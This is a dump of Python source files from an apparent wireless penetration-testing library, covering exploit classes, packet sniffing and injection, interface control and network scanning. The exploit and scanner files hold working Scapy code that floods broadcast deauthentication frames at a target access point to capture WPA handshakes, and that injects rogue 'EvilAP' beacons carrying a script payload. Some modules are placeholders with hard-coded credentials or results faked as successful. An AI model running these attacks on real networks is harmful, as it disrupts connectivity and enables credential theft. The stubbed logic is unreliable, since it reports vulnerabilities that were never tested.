        'payload_delivery': PayloadDelivery,
        'credential_extraction': CredentialExtraction
    }



# exploits/base_exploit.py
from abc import ABC, abstractmethod
import logging

class BaseExploit:
    def __init__(self, *args, **kwargs):
        """
        Initialize the BaseExploit with necessary parameters.
        """
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"{self.__class__.__name__} initialized with parameters: {kwargs}")

    def execute(self, vuln_info: dict):
        """
        Execute the exploit based on vulnerability information.

        Args:
            vuln_info (dict): Information about the vulnerability to exploit.
        """
        self.logger.info(f"Executing exploit with vulnerability info: {vuln_info}")
        # Placeholder for exploit logic
        pass

# exploits/credential_extraction.py
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.eap import EAPOL

from .base_exploit import BaseExploit
from scapy.all import *
import time
import threading

class CredentialExtraction(BaseExploit):
    def __init__(self, core_framework, vulnerability):
        super().__init__(core_framework, vulnerability)
        self.extracting = False
        self.extract_thread = None
        self.captured_handshakes = []
        self.vulnerability = vulnerability
        self.core = core_framework

    def exploit(self):
        """
        Executes the credential extraction process.
        """
        self.logger.info("Starting Credential Extraction exploit.")
        target_network = self.vulnerability.get('target_network')

        if not target_network:
            self.logger.error("No target network specified for credential extraction.")
            return

        # Start capturing WPA/WPA2 handshakes
        self.extracting = True
        self.extract_thread = threading.Thread(target=self._capture_handshakes, args=(target_network,))
        self.extract_thread.start()
        self.logger.info("Credential Extraction exploit initiated.")
        return {"status": "success"}

    def _capture_handshakes(self, target_network):
        """
        Captures WPA/WPA2 handshakes by performing deauthentication attacks.
        """
        bssid = target_network.get('bssid')
        channel = target_network.get('channel')

        if not all([bssid, channel]):
            self.logger.error("Incomplete target network information for handshake capture.")
            return

        try:
            # Set the wireless interface to the target channel
            os.system(f"iwconfig {self.core.packet_handler.packet_injector.interface} channel {channel}")

            while self.extracting:
                # Send deauthentication frames to prompt clients to reconnect and capture handshakes
                deauth_pkt = RadioTap()/Dot11(addr1='FF:FF:FF:FF:FF:FF',
                                              addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                                              addr3=bssid)/Dot11Deauth(reason=7)
                sendp(deauth_pkt, iface=self.core.packet_handler.packet_injector.interface, count=1, inter=0.1, verbose=False)
                time.sleep(2)  # Interval between deauth attempts
        except Exception as e:
            self.logger.error(f"Error during handshake capture: {e}")

    def capture_handshake_callback(self, packet):
        """
        Callback function to process captured packets and extract handshakes.
        """
        if packet.haslayer(EAPOL):
            self.logger.info(f"Captured EAPOL handshake from {packet.addr2}")
            self.captured_handshakes.append(packet)
            # Optionally, notify or process the handshake further

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Credential Extraction exploit.")
        self.extracting = False
        if self.extract_thread and self.extract_thread.is_alive():
            self.extract_thread.join()
            self.logger.info("Credential Extraction exploit stopped.")

        # Optionally, process or save captured handshakes
        self.logger.info(f"Total handshakes captured: {len(self.captured_handshakes)}")
        # Implement further processing like saving to a file or initiating a cracking process


# exploits/payload_delivery.py
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

from .base_exploit import BaseExploit
from scapy.all import *
import time

class PayloadDelivery(BaseExploit):
    def __init__(self, core_framework, vulnerability):
        super().__init__(core_framework, vulnerability)
        self.delivering = False
        self.vulnerability = vulnerability
        self.core = core_framework

    def exploit(self):
        """
        Executes the payload delivery process.
        """
        self.logger.info("Starting Payload Delivery exploit.")
        target_device = self.vulnerability.get('target_device')

        if not target_device:
            self.logger.error("No target device specified for payload delivery.")
            return

        # Determine the payload type based on the vulnerability
        payload_type = self.vulnerability.get('payload_type', 'generic')

        # Craft the malicious payload
        payload = self._craft_payload(payload_type, target_device)

        if not payload:
            self.logger.error("Failed to craft payload.")
            return

        # Send the payload
        try:
            self.delivering = True
            # Example: Inject the payload into a beacon frame (beacon flooding)
            dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF',
                         addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                         addr3=self.core.packet_handler.packet_injector.get_interface_mac())
            beacon = Dot11Beacon(cap='ESS+privacy')
            essid = Dot11Elt(ID='SSID', info='EvilAP', len=len('EvilAP'))
            payload_element = Dot11Elt(ID='Vendor Specific', info=payload)
            frame = RadioTap()/dot11/beacon/essid/payload_element

            # Start a continuous injection of the malicious beacon frames
            self.core.send_continuous_packets(frame, interval=0.1)
            self.logger.info("Payload Delivery exploit initiated.")
            return {"status": "success"}
        except Exception as e:
            self.logger.error(f"Failed to deliver payload: {e}")

    def _craft_payload(self, payload_type, target_device):
        """
        Crafts the malicious payload based on the specified type.
        """
        if payload_type == 'reverse_shell':
            # Example: Reverse shell payload
            # WARNING: This is a placeholder. Crafting actual reverse shells requires careful implementation.
            payload = b'\x90' * 100  # NOP sled as a placeholder
            return payload
        elif payload_type == 'malicious_script':
            # Example: Inject a malicious script into a beacon frame
            script = "<script>alert('Malicious Payload');</script>"
            payload = script.encode('utf-8')
            return payload
        else:
            self.logger.warning(f"Unknown payload type: {payload_type}")
            return None

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Payload Delivery exploit.")
        self.delivering = False
        self.core.stop_continuous_packets()
        self.logger.info("Payload Delivery exploit stopped.")


# exploits/session_hijacking.py
# wireless_pen_test_lib/exploits/session_hijacking.py

import time
from .base_exploit import BaseExploit
import logging


class SessionHijacking(BaseExploit):
    def __init__(self, max_packets: int = 100):
        """
        Initialize the SessionHijacking exploit.

        Args:
            max_packets (int): Maximum number of packets to send during ARP spoofing.
        """
        super().__init__(max_packets=max_packets)
        self.max_packets = max_packets
        self.detected_vulnerabilities = []

    def execute(self, vuln_info: dict):
        """
        Execute the session hijacking exploit.

        Args:
            vuln_info (dict): Information about the vulnerability.
        """
        self.logger.info(f"Starting Session Hijacking on target IP: {vuln_info.get('target_ip')}")
        # Placeholder for actual exploit logic
        time.sleep(5)  # Simulate time taken to perform the exploit
        # Simulate successful exploitation
        vulnerability = {
            "bssid": vuln_info.get('bssid', 'N/A'),
            "description": "Session hijacking successful.",
            "action": "Gained unauthorized access."
        }
        self.detected_vulnerabilities.append(vulnerability)
        self.logger.info("Session Hijacking completed successfully.")
        return {"exploits": {"session_hijacking": self.detected_vulnerabilities}}

# exploits/__init__.py


# packet_handler/packet_analyzer.py
from scapy.all import *
import logging

from scapy.layers.dot11 import Dot11Elt, Dot11Deauth, Dot11Beacon, Dot11


class PacketAnalyzer:
    def __init__(self, event_dispatcher):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.event_dispatcher = event_dispatcher

    def analyze_packet(self, packet):
        self.logger.debug(f"Analyzing packet: {packet.summary()}")

        if packet.haslayer(Dot11):
            dot11 = packet.getlayer(Dot11)

            # Beacon Frames
            if packet.haslayer(Dot11Beacon):
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                bssid = dot11.addr3
                self.logger.info(f"Beacon Frame - SSID: {ssid}, BSSID: {bssid}")
                self.event_dispatcher.dispatch('beacon_detected', ssid=ssid, bssid=bssid)

            # Deauthentication Frames
            elif packet.haslayer(Dot11Deauth):
                reason = packet[Dot11Deauth].reason
                addr1 = dot11.addr1
                addr2 = dot11.addr2
                bssid = dot11.addr3
                self.logger.info(f"Deauth Frame - Addr1: {addr1}, Addr2: {addr2}, BSSID: {bssid}, Reason: {reason}")
                self.event_dispatcher.dispatch('deauth_detected', addr1=addr1, addr2=addr2, bssid=bssid, reason=reason)

            # Probe Request Frames
            elif packet.type == 0 and packet.subtype == 4:
                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet.haslayer(Dot11Elt) else ''
                client_mac = dot11.addr2
                self.logger.info(f"Probe Request - SSID: {ssid}, Client MAC: {client_mac}")
                self.event_dispatcher.dispatch('probe_request_detected', ssid=ssid, client_mac=client_mac)

            # Add more analyses as needed


# packet_handler/packet_injector.py
import time

from scapy.all import *
import logging
import threading

class PacketInjector:
    def __init__(self, interface='wlan0mon'):
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.injecting = False
        self.inject_thread = None

    def send_packet(self, packet, count=1, inter=0.1):
        """
        Sends a crafted packet.

        :param packet: Scapy packet to send.
        :param count: Number of times to send the packet.
        :param inter: Interval between packet sends.
        """
        self.logger.info(f"Sending packet: {packet.summary()} | Count: {count} | Interval: {inter}s")
        try:
            sendp(packet, iface=self.interface, count=count, inter=inter, verbose=False)
            self.logger.info("Packet sent successfully.")
        except Exception as e:
            self.logger.error(f"Failed to send packet: {e}")

    def send_continuous(self, packet, interval=0.1):
        """
        Continuously sends a crafted packet at specified intervals.

        :param packet: Scapy packet to send.
        :param interval: Time between sends in seconds.
        """
        self.injecting = True
        self.inject_thread = threading.Thread(target=self._inject_loop, args=(packet, interval))
        self.inject_thread.start()
        self.logger.info("Started continuous packet injection.")

    def _inject_loop(self, packet, interval):
        while self.injecting:
            try:
                sendp(packet, iface=self.interface, count=1, inter=0, verbose=False)
                self.logger.debug(f"Injected packet: {packet.summary()}")
                time.sleep(interval)
            except Exception as e:
                self.logger.error(f"Error during packet injection: {e}")

    def stop_continuous(self):
        """
        Stops continuous packet injection.
        """
        self.injecting = False
        if self.inject_thread and self.inject_thread.is_alive():
            self.inject_thread.join()
            self.logger.info("Stopped continuous packet injection.")


# packet_handler/packet_sniffer.py
from scapy.all import sniff
import logging
import threading

class PacketSniffer:
    def __init__(self, interface='wlan0mon', filter=None, prn=None):
        """
        Initializes the PacketSniffer.

        :param interface: Wireless interface in monitor mode.
        :param filter: BPF filter string.
        :param prn: Callback function to process each packet.
        """
        self.interface = interface
        self.filter = filter
        self.prn = prn
        self.logger = logging.getLogger(self.__class__.__name__)
        self.sniffing = False
        self.sniff_thread = None

    def start_sniffing(self):
        """
        Starts packet sniffing in a separate thread.
        """
        self.sniffing = True
        self.sniff_thread = threading.Thread(target=self._sniff)
        self.sniff_thread.start()
        self.logger.info("Started packet sniffing.")

    def _sniff(self):
        """
        Internal method to perform sniffing.
        """
        try:
            sniff(iface=self.interface, filter=self.filter, prn=self.prn, stop_filter=lambda x: not self.sniffing)
        except Exception as e:
            self.logger.error(f"Error during packet sniffing: {e}")

    def stop_sniffing(self):
        """
        Stops packet sniffing.
        """
        self.sniffing = False
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()
            self.logger.info("Stopped packet sniffing.")


# packet_handler/__init__.py


# project_specifc_utils/authentication_tools.py
# wireless_pen_test_lib/project_specifc_utils/authentication_tools.py

import logging

class AuthenticationTools:
    def __init__(self):
        """
        Initialize the AuthenticationTools.
        """
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info("AuthenticationTools initialized.")

    def decrypt_credentials(self, encrypted_data: str) -> dict:
        """
        Decrypts captured encrypted credentials.

        Args:
            encrypted_data (str): Encrypted credentials.

        Returns:
            dict: Decrypted credentials.
        """
        self.logger.debug("Decrypting credentials...")
        # Placeholder for decryption logic


        decrypted = {
            "username": "admin",
            "password": "password123"
        }
        self.logger.info("Credentials decrypted successfully.")
        return decrypted

    def authenticate(self, username: str, password: str) -> bool:
        """
        Authenticates the user with the provided credentials.

        Args:
            username (str): User's username.
            password (str): User's password.

        Returns:
            bool: True if authentication is successful, False otherwise.
        """
        self.logger.debug("Authenticating user...")
        # Placeholder for authentication logic
        authenticated = username == "admin" and password == "password123"
        if authenticated:
            self.logger.info("User authenticated successfully.")
        else:
            self.logger.warning("Authentication failed.")
        return authenticated

# project_specifc_utils/data_storage_manager.py
# wireless_pen_test_lib/project_specifc_utils/data_storage_manager.py

import os
import json
import logging

class DataStorageManager:
    def __init__(self, report_directory: str = "reports"):
        """
        Initialize the DataStorageManager with the specified report directory.

        Args:
            report_directory (str): Path to the directory where reports will be stored.
        """
        self.report_directory = report_directory
        os.makedirs(self.report_directory, exist_ok=True)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"DataStorageManager initialized for report directory: {self.report_directory}")

    def generate_report(self, vulnerability_db: dict):
        """
        Generates a report based on the vulnerability database.

        Args:
            vulnerability_db (dict): Dictionary containing detected vulnerabilities.
        """
        self.logger.info("Generating reports...")
        # Ensure report directories exist
        json_dir = os.path.join(self.report_directory, "json")
        txt_dir = os.path.join(self.report_directory, "txt")
        os.makedirs(json_dir, exist_ok=True)
        os.makedirs(txt_dir, exist_ok=True)

        # JSON Report
        json_report_path = os.path.join(json_dir, "report.json")
        with open(json_report_path, 'w') as f:
            json.dump(vulnerability_db, f, indent=4)
        self.logger.info(f"JSON report generated at {json_report_path}")

        # TXT Report
        txt_report_path = os.path.join(txt_dir, "report.txt")
        with open(txt_report_path, 'w') as f:
            for scanner, vulnerabilities in vulnerability_db.get('scans', {}).items():
                f.write(f"Scanner: {scanner}\n")
                for vuln in vulnerabilities:
                    f.write(f"  - SSID: {vuln.get('ssid', 'N/A')}\n")
                    f.write(f"    BSSID: {vuln.get('bssid', 'N/A')}\n")
                    f.write(f"    Protocol: {vuln.get('protocol', 'N/A')}\n")
                    f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
            for exploit, vulnerabilities in vulnerability_db.get('exploits', {}).items():
                f.write(f"Exploit: {exploit}\n")
                for vuln in vulnerabilities:
                    f.write(f"  - BSSID: {vuln.get('bssid', 'N/A')}\n")
                    f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
                    f.write(f"    Action: {vuln.get('action', 'N/A')}\n")
        self.logger.info(f"TXT report generated at {txt_report_path}")

# project_specifc_utils/network_interface_manager.py
# wireless_pen_test_lib/project_specifc_utils/network_interface_manager.py

import subprocess
import logging

class NetworkInterfaceManager:
    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize the NetworkInterfaceManager with the specified interface.

        Args:
            interface (str): Name of the wireless interface.
        """
        if not self.is_valid_interface(interface):
            raise ValueError(f"Invalid network interface: {interface}")
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"NetworkInterfaceManager initialized for interface: {self.interface}")

    def is_valid_interface(self, interface: str) -> bool:
        available_interfaces = self.get_available_interfaces()
        return interface in available_interfaces

    def get_available_interfaces(self) -> list:
        # This should be replaced with actual system call to list interfaces
        return ['wlan0mon', 'eth0', 'lo']

    def get_interface_mac(self) -> str:
        """
        Retrieves the MAC address of the wireless interface.

        Returns:
            str: MAC address of the interface.
        """
        try:
            result = subprocess.check_output(["ifconfig", self.interface], stderr=subprocess.STDOUT).decode()
            mac_address = result.split("ether ")[1].split(" ")[0]
            return mac_address
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to get MAC address: {e.output.decode()}")
            return "00:00:00:00:00:00"

    def set_monitor_mode(self):
        """
        Sets the wireless interface to monitor mode.
        """
        self.logger.info(f"Setting interface {self.interface} to monitor mode.")
        try:
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "monitor"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} set to monitor mode successfully.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            raise e

    def set_managed_mode(self):
        """
        Sets the wireless interface to managed mode.
        """
        self.logger.info(f"Setting interface {self.interface} to managed mode.")
        try:
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], check=True)
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "managed"], check=True)
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            self.logger.info(f"Interface {self.interface} set to managed mode successfully.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set managed mode: {e}")
            raise e

    def get_interface_status(self) -> str:
        """
        Retrieves the current status of the wireless interface.

        Returns:
            str: Current mode of the interface (e.g., Monitor, Managed).
        """
        try:
            result = subprocess.check_output(["iwconfig", self.interface], stderr=subprocess.STDOUT).decode()
            if "Mode:Monitor" in result:
                return "Monitor Mode"
            elif "Mode:Managed" in result:
                return "Managed Mode"
            else:
                return "Unknown Mode"
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to get interface status: {e.output.decode()}")
            return "Unknown Mode"

# project_specifc_utils/network_scanner.py
#!/usr/bin/env python3
import subprocess
import re
from scapy.all import srp, conf
from scapy.layers.l2 import ARP, Ether
import netifaces
import sys
import logging
import argparse

# Configure logging
logger = logging.getLogger('NetworkScanner')

def setup_logging(level):
    """
    Sets up logging with the specified level.
    """
    numeric_level = getattr(logging, level.upper(), None)
    if not isinstance(numeric_level, int):
        print(f"Invalid log level: {level}")
        sys.exit(1)
    logging.basicConfig(
        level=numeric_level,
        format='[%(asctime)s] %(levelname)s - %(name)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )

def scan_wireless_networks(interface='wlan0'):
    """
    Scans for wireless networks using iwlist.

    Args:
        interface (str): The wireless interface to scan.

    Returns:
        List[dict]: A list of dictionaries containing SSID, BSSID, Signal Level, and Channel.
    """
    logger.info(f"Scanning for wireless networks on interface: {interface}")
    try:
        # Execute iwlist scan command
        scan_output = subprocess.check_output(['iwlist', interface, 'scanning'], stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to execute iwlist: {e.output}")
        return []

    # Parse the output
    cells = scan_output.split('Cell ')
    networks = []

    for cell in cells[1:]:
        ssid_search = re.search(r'ESSID:"(.*)"', cell)
        ssid = ssid_search.group(1) if ssid_search else 'Hidden'

        bssid_search = re.search(r'Address: ([\w:]+)', cell)
        bssid = bssid_search.group(1) if bssid_search else 'Unknown'

        signal_search = re.search(r'Signal level=(-?\d+) dBm', cell)
        signal = signal_search.group(1) + ' dBm' if signal_search else 'N/A'

        channel_search = re.search(r'Channel:(\d+)', cell)
        channel = channel_search.group(1) if channel_search else 'N/A'

        networks.append({
            'SSID': ssid,
            'BSSID': bssid,
            'Signal': signal,
            'Channel': channel
        })

    logger.info(f"Found {len(networks)} wireless networks.")
    return networks

def get_default_gateway_ip():
    """
    Retrieves the default gateway IP address.

    Returns:
        str: The default gateway IP.
    """
    gateways = netifaces.gateways()
    default_gateway = gateways.get('default')
    if default_gateway is None:
        logger.error("No default gateway found.")
        sys.exit(1)
    gateway_ip = default_gateway[netifaces.AF_INET][0]
    return gateway_ip

def get_network_prefix(interface):
    """
    Retrieves the network prefix (e.g., 192.168.1.0/24).

    Args:
        interface (str): The network interface.

    Returns:
        str: The network prefix.
    """
    addrs = netifaces.ifaddresses(interface)
    inet = addrs.get(netifaces.AF_INET)
    if not inet:
        logger.error(f"No IPv4 address found for interface {interface}.")
        sys.exit(1)
    ip_info = inet[0]
    ip_address = ip_info.get('addr')
    netmask = ip_info.get('netmask')
    if not ip_address or not netmask:
        logger.error(f"IP address or netmask not found for interface {interface}.")
        sys.exit(1)
    # Calculate CIDR notation
    cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
    network_prefix = f"{ip_address}/{cidr}"
    return network_prefix

def scan_local_network(interface='eth0'):
    """
    Scans the local network for active devices using ARP requests.

    Args:
        interface (str): The network interface to use for scanning.

    Returns:
        List[dict]: A list of dictionaries containing IP and MAC addresses.
    """
    logger.info(f"Scanning local network on interface: {interface}")
    network = get_network_prefix(interface)
    logger.debug(f"Network prefix: {network}")

    # Create ARP packet
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Disable verbose in scapy
    conf.verb = 0

    try:
        result = srp(packet, timeout=3, iface=interface, inter=0.1)[0]
    except Exception as e:
        logger.error(f"Error during ARP scan: {e}")
        return []

    devices = []
    for sent, received in result:
        devices.append({
            'IP': received.psrc,
            'MAC': received.hwsrc
        })

    logger.info(f"Found {len(devices)} devices on the local network.")
    return devices

def get_active_interfaces():
    """
    Retrieves active network interfaces.

    Returns:
        List[str]: A list of active network interface names.
    """
    interfaces = netifaces.interfaces()
    active_interfaces = []
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            active_interfaces.append(interface)
    return active_interfaces

def display_wireless_networks(networks):
    """
    Displays the list of wireless networks.

    Args:
        networks (List[dict]): List of wireless networks.
    """
    if not networks:
        logger.info("No wireless networks found.")
        return

    print("\n=== Wireless Networks ===")
    print(f"{'SSID':<30} {'BSSID':<20} {'Signal':<10} {'Channel':<8}")
    print("-" * 70)
    for net in networks:
        print(f"{net['SSID']:<30} {net['BSSID']:<20} {net['Signal']:<10} {net['Channel']:<8}")

def display_local_devices(devices):
    """
    Displays the list of devices on the local network.

    Args:
        devices (List[dict]): List of devices with IP and MAC addresses.
    """
    if not devices:
        logger.info("No devices found on the local network.")
        return

    print("\n=== Local Network Devices ===")
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 40)
    for device in devices:
        print(f"{device['IP']:<20} {device['MAC']:<20}")

def parse_arguments():
    """
    Parses command-line arguments.

    Returns:
        argparse.Namespace: Parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Network Devices Scanner Utility")
    parser.add_argument(
        '-w', '--wireless-interface',
        type=str,
        default=None,
        help="Specify the wireless interface to scan (e.g., wlan0). If not provided, the script will auto-detect."
    )
    parser.add_argument(
        '-e', '--ethernet-interface',
        type=str,
        default=None,
        help="Specify the Ethernet interface to scan (e.g., eth0). If not provided, the script will auto-detect."
    )
    parser.add_argument(
        '-l', '--log-level',
        type=str,
        default='INFO',
        help="Set the logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL). Default is INFO."
    )
    return parser.parse_args()

def main():
    args = parse_arguments()
    setup_logging(args.log_level)

    # Determine active wireless interface
    active_interfaces = get_active_interfaces()
    wireless_interfaces = [iface for iface in active_interfaces if 'wlan' in iface]

    if args.wireless_interface:
        wireless_interface = args.wireless_interface
        if wireless_interface not in wireless_interfaces:
            logger.error(f"Specified wireless interface '{wireless_interface}' is not active or not found.")
            sys.exit(1)
    else:
        if not wireless_interfaces:
            logger.error("No wireless interfaces found. Ensure your wireless adapter is connected.")
            sys.exit(1)
        wireless_interface = wireless_interfaces[0]

    networks = scan_wireless_networks(interface=wireless_interface)
    display_wireless_networks(networks)

    # Determine active Ethernet interface for local network scan
    ethernet_interfaces = [iface for iface in active_interfaces if 'eth' in iface or 'enp' in iface or 'eno' in iface]
    if args.ethernet_interface:
        ethernet_interface = args.ethernet_interface
        if ethernet_interface not in ethernet_interfaces:
            logger.error(f"Specified Ethernet interface '{ethernet_interface}' is not active or not found.")
            sys.exit(1)
    else:
        if not ethernet_interfaces:
            logger.error("No Ethernet interfaces found. Ensure you are connected to a network.")
            sys.exit(1)
        ethernet_interface = ethernet_interfaces[0]

    devices = scan_local_network(interface=ethernet_interface)
    display_local_devices(devices)

if __name__ == "__main__":
    main()


# project_specifc_utils/save_project_files_to_txt_file.py
import os
import sys
import argparse
import logging


def setup_logging(verbosity):
    """
    Set up logging configuration based on verbosity level.
    """
    log_levels = {
        0: logging.ERROR,
        1: logging.WARNING,
        2: logging.INFO,
        3: logging.DEBUG
    }
    level = log_levels.get(verbosity, logging.DEBUG)

    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )


def get_default_exclusions():
    """
    Returns a set of default directory names to exclude from processing.
    """
    return {
        '.venv', 'venv', 'env', 'ENV', '__pycache__', 'site-packages',
        'build', 'dist', '.git', '.svn', '.hg', '.idea', '.mypy_cache',
        '.pytest_cache', '.tox', '.eggs', 'egg-info'
    }


def collect_py_files(project_dir, output_file, exclude_dirs):
    """
    Walk through the project directory recursively, find all .py files
    excluding specified directories, and append their contents to the
    output_file with the filename as a comment.
    """
    try:
        with open(output_file, 'w', encoding='utf-8') as outfile:
            logging.info(f"Opened output file: {output_file} for writing.")
            for root, dirs, files in os.walk(project_dir):
                logging.debug(f"Walking through directory: {root}")

                # Modify dirs in-place to exclude unwanted directories
                dirs_to_remove = [d for d in dirs if d in exclude_dirs]
                for d in dirs_to_remove:
                    dirs.remove(d)
                    logging.debug(f"Excluded directory from traversal: {d}")

                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        relative_path = os.path.relpath(file_path, project_dir)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as infile:
                                content = infile.read()
                            # Write the filename as a comment
                            outfile.write(f"# {relative_path}\n")
                            logging.debug(f"Writing header for file: {relative_path}")
                            # Write the file content
                            outfile.write(content + "\n\n")
                            logging.info(f"Appended: {relative_path}")
                        except FileNotFoundError:
                            logging.error(f"File not found: {file_path}")
                        except PermissionError:
                            logging.error(f"Permission denied: {file_path}")
                        except Exception as e:
                            logging.error(f"Failed to read {file_path}: {e}")
        logging.info(f"Successfully wrote to output file: {output_file}")
    except PermissionError:
        logging.critical(f"Permission denied when trying to write to output file: {output_file}")
        sys.exit(1)
    except Exception as e:
        logging.critical(f"An unexpected error occurred while opening the output file: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Recursively collect all user-created .py files in a project and append their contents to a single .txt file."
    )
    parser.add_argument(
        'project_directory',
        nargs='?',
        default='.',
        help='Path to the Python project directory (default: current directory)'
    )
    parser.add_argument(
        '-o', '--output',
        default='combined_py_files.txt',
        help='Name of the output .txt file (default: combined_py_files.txt)'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='count',
        default=2,
        help='Increase output verbosity (e.g., -v, -vv, -vvv)'
    )
    parser.add_argument(
        '-e', '--exclude',
        nargs='*',
        default=[],
        help='Additional directories to exclude from processing (space-separated)'
    )

    args = parser.parse_args()

    setup_logging(args.verbose)

    project_dir = os.path.abspath(args.project_directory)
    output_file = os.path.abspath(args.output)

    logging.info(f"Project Directory: {project_dir}")
    logging.info(f"Output File: {output_file}\n")

    if not os.path.isdir(project_dir):
        logging.critical(f"The specified project directory does not exist or is not a directory: {project_dir}")
        sys.exit(1)

    # Combine default exclusions with user-specified exclusions
    exclude_dirs = get_default_exclusions().union(set(args.exclude))
    logging.debug(f"Directories to exclude: {exclude_dirs}")

    collect_py_files(project_dir, output_file, exclude_dirs)

    logging.info("\nAll .py files have been processed.")
    logging.info(f"Combined file saved as: {output_file}")


if __name__ == "__main__":
    main()


# project_specifc_utils/__init__.py


# scanners/auth_bypass_scanner.py
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scanners.base_scanner import BaseScanner
from scapy.all import sendp, sniff
import time
import logging
from threading import Thread

class AuthBypassScanner(BaseScanner):
    def __init__(self, core_framework, scan_duration: int = 10):
        """
        Initialize the AuthBypassScanner with core framework and scan duration.

        Args:
            core_framework (CoreFramework): Instance of CoreFramework.
            scan_duration (int): Duration to run the scan in seconds.
        """
        super().__init__(core_framework, scan_duration)
        self.detected_vulnerabilities = []
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.info(f"AuthBypassScanner initialized with scan duration: {self.scan_duration} seconds.")
        self.core_framework = core_framework
        self.scan_duration = scan_duration

    def scan(self, target):
        """
        Scans the target network for authentication bypass vulnerabilities.
        """
        self.logger.info(f"Starting Authentication Bypass Scan on target: {target}")

        bssid = target.get('bssid')
        if not bssid:
            self.logger.error("Target BSSID not specified.")
            return

        self.logger.info(f"Sending deauthentication frames to BSSID: {bssid}")

        # Construct the deauthentication packet
        deauth_pkt = RadioTap() / Dot11(
            addr1='FF:FF:FF:FF:FF:FF',  # Broadcast
            addr2=self.core_framework.network_manager.get_interface_mac(),  # Attacker MAC
            addr3=bssid  # Target AP BSSID
        ) / Dot11Deauth(reason=7)

        # Start monitoring client behavior in a separate thread
        self.logger.info("Monitoring client behavior for authentication bypass detection.")
        stop_sniffing = False

        def monitor_clients(packet):
            """
            Callback function to monitor packets for signs of authentication bypass.
            """
            nonlocal stop_sniffing

            if packet.haslayer(Dot11):
                # Check if the packet is a probe request or reauthentication attempt
                client_mac = packet.addr2
                if client_mac and packet.type == 0 and packet.subtype in [4, 11]:  # Probe Request or Authentication
                    self.logger.info(f"Client {client_mac} attempting to reconnect.")
                elif client_mac:
                    self.logger.warning(f"Client {client_mac} appears to have disconnected unexpectedly.")

            return not stop_sniffing

        # Start packet sniffing in a separate thread
        sniff_thread = Thread(target=sniff, kwargs={
            'prn': monitor_clients,
            'timeout': self.scan_duration,
            'store': False,
        }, daemon=True)
        sniff_thread.start()

        # Launch deauthentication attack
        self.core_framework.send_continuous_packets(deauth_pkt, interval=0.1)

        # Allow the attack to run for the specified duration
        time.sleep(self.scan_duration)
        self.core_framework.stop_continuous_packets()

        # Stop sniffing and wait for the thread to finish
        stop_sniffing = True
        sniff_thread.join()

        # Analyze results
        # This placeholder logic simulates detection of a vulnerability if no reauthentication packets were observed
        # during the monitoring period.
        vulnerability_detected = True  # Replace with actual analysis logic
        if vulnerability_detected:
            vulnerability = {
                'type': 'Authentication Bypass',
                'description': 'Clients failed to properly reauthenticate after deauthentication frames were sent.',
                'bssid': bssid,
                'action': 'Ensure strong authentication mechanisms are implemented.'
            }
            self.detected_vulnerabilities.append(vulnerability)
            self.core_framework.vulnerability_db.setdefault('AUTH_BYPASS', []).append(vulnerability)
            self.logger.warning(f"Authentication Bypass Vulnerability Detected: {vulnerability}")
        else:
            self.logger.info("No Authentication Bypass Vulnerabilities Detected.")

        return {"scans": {"auth_bypass_scanner": self.detected_vulnerabilities}}

    def report(self):
        """
        Generates a report of detected authentication bypass vulnerabilities.
        """
        self.logger.info("Generating Authentication Bypass Scan Report...")
        if not self.detected_vulnerabilities:
            self.logger.info("No authentication bypass vulnerabilities detected.")
            return

        print("\n=== Authentication Bypass Scan Report ===")
        for vuln in self.detected_vulnerabilities:
            print(f"- BSSID: {vuln['bssid']}")
            print(f"  Description: {vuln['description']}")
            print(f"  Action: {vuln['action']}\n")

